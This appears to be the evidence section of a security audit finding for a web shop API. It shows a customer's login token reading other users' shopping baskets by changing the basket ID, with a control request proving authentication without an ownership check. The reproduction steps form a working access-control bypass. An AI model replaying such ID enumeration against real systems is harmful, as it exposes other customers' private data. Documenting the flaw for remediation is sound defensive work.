finding.evidence:
Registered customer i35test@example.com (user id 31, basket id 11) via POST /api/Users, logged in at POST /rest/user/login (200, token bid=11).
GET /rest/basket/11 with Authorization: Bearer <customer JWT> -> 200 {"status":"success","data":{"id":11,"UserId":31,...}}
GET /rest/basket/1 with the SAME customer JWT -> 200 1994 bytes {"status":"success","data":{"id":1,"UserId":1,...,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...}]}}
GET /rest/basket/2 -> 200 UserId:2; /rest/basket/3 -> 200 UserId:3; /rest/basket/4 -> 200 UserId:11; /rest/basket/5 -> 200 UserId:16 (all with same token).
Control: GET /rest/basket/1 with NO Authorization header -> 401 UnauthorizedError: No Authorization header was found. So the endpoint requires auth but performs no ownership check.

